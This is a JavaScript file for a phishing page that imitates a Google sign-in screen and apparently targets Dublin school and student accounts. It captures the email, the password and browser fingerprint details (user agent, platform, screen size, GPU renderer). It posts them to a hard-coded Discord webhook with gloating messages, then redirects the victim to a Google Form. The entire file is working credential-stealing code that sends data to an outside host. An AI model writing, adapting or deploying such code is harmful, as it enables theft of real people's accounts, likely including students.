let whitelist = {
  domain: ["dublinstudents","dublinschools"],
  com: ["net"]
}
let onEmail = true;
let email = "";
let password = "";
let whatwewant = [false, false];

let c = document.getElementById("vJAnsda").getContext("experimental-webgl");
let renderer = getUnmasked(c);

function getUnmasked(gl) {
  let renderer = "";
  let dgb = gl.getExtension("WEBGL_debug_renderer_info");
  if(dgb != null) {
    renderer = gl.getParameter(dgb.UNMASKED_RENDERER_WEBGL);
  }
  return renderer;
}

function fixEmailPhone() {
  if(document.getElementById("eemaail").value.length > 0) {
    document.getElementById("hibAfbi").className = "rFrNMe N3Hzgf jjwyfe QBQrY zKHdkd sdJrJc Tyc9J CDELXb u3bW4e";
  }
  if(document.getElementById("paasswoord").value.length > 0) {
    document.getElementById("password").className = "rFrNMe ze9ebf YKooDc q9Nsuf zKHdkd sdJrJc u3bW4e";
  }
  if(document.getElementById("showPassword").checked) {
    document.getElementById("paasswoord").type = "text";
  }else {
    document.getElementById("paasswoord").type = "password";
  }
}
setInterval(fixEmailPhone, 0);

document.getElementById("selectionc0").addEventListener("click", e => {
  document.getElementById("showPassword").click();
});

document.getElementById("next").addEventListener("click", e => {
  email = document.getElementById("eemaail").value;
  if(email.length > 0 && email.indexOf("@") > 0 && email.indexOf(".") > 0 && email.indexOf("@") < email.lastIndexOf(".")) {
    let domain = email.slice(email.indexOf("@") + 1, email.lastIndexOf("."));
    let com = email.slice(email.lastIndexOf("."), Infinity);
    whatwewant = [false, false];
    if(domain.length > 0) {
      if(whitelist.domain.indexOf(domain) !== -1) {
        whatwewant[0] = true;
      }
      if(com.length > 1) {
        if(whitelist.com.indexOf(com) !== -1) {
          whatwewant[1] = true;
        }
        document.getElementById("jnAJSdb").textContent = email;
        switchStates();
      }else {
        // Invalid
      }
    }else {
      // Invalid
    }
  }else {
    // Invalid
  }
});

document.getElementById("pwdNext").addEventListener("click", async () => {
  password = document.getElementById("paasswoord").value;
  if(password.length > 7) {
    let bot = new DCBot("JeBnwoVFe0l-Bd5UXxu_4_IRX5GwZts_T3afl68g5AuQe8fViTHF-WS6IAD392qIEQ3s","796109624406573086");
    let url = "https://pngimg.com/uploads/raccoon/raccoon_PNG16969.png";
    if(whatwewant[0]) {
      if(email.indexOf("dublinschools")) {
        url = "https://clipground.com/images/santa-with-moose-clipart-19.png";
      }else if(email.indexOf("dublinstudents")) {
        url = "https://east-hill-farm.com/wp-content/uploads/2015/06/Donkey-Trio-Spring.png"
      }
    }

    document.getElementById("yDmH0d").style.display = "none";
    document.getElementById("jbAJsd").style.display = "none";
    bot.send(`**Fuck Yeah!**\`\`\`md\n[Email](${email})\n[Password](${password})\n\n[clientInformation.userAgent](${window.clientInformation.userAgent.split("(").join("[").split(")").join("]")})\n[clientInformation.platform](${window.clientInformation.platform})\n[Window Size](${window.outerWidth}x${window.outerHeight} [${window.screen.orientation.type}])\n[Screen Size](${window.screen.width}x${window.screen.height})\n[Renderer](${renderer})\`\`\``, `Another one bit the dust @ ${new Date().toString().split("GMT")[0]}`, url);
    await sleep(3000);
    document.location.href = "https://docs.google.com/forms/d/1YRuUCeuEqo0h42-WXLtneaYY_gKhD8JG4jvdKOj8kBE/edit?usp=sharing";
  }else {
    // Invalid
  }
});

function sleep(ms){
  return new Promise(r => setTimeout(r, ms));
}

function switchStates() {
  if(onEmail) {
    document.getElementById("yDmH0d").style.display = "none";
    document.getElementById("jbAJsd").style.display = null;
  }else {
    document.getElementById("yDmH0d").style.display = null;
    document.getElementById("jbAJsd").style.display = "none";
  }
  onEmail = !onEmail;
}

document.body.addEventListener("keydown", e => {
  if(e.keyCode === 13) {
    if(onEmail) {
      document.getElementById("next").click();
    }else {
      document.getElementById("pwdNext").click();
    }
  }
})

function DCBot(id, token){
  this.id = id;
  this.token = token;
  this.url = `https://discordapp.com/api/webhooks/${token}/${id}`;
  this.send = (message, username, avatarUrl) => {
    let jsonBody;
    if(message == null){
      console.error("no message provided");
      return;
    } else if(username == null){
      jsonBody = JSON.stringify({
        "content": message
      });
    } else if(avatarUrl == null){
      jsonBody = JSON.stringify({
        "content": message,
        "username": username
      });
    } else {
      jsonBody = JSON.stringify({
        "content": message,
        "username": username,
        "avatar_url": avatarUrl
      });
    }
    fetch(this.url, {
      method: "POST",
      headers: {
        "Accept": "application/json",
        "Content-Type": "application/json"
      },
      body: jsonBody
    });
  };
}
